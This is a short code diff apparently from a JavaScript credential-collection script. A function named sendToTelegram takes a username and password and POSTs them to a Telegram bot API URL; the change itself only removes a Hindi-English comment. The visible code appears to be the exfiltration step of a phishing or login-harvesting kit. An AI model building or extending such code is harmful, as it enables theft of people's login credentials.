@@ -11,7 +11,7 @@ async function sendToTelegram(username, password) {
   const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
 
   try {
-    // POST request bhejna Telegram par
+    
     const response = await fetch(url, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
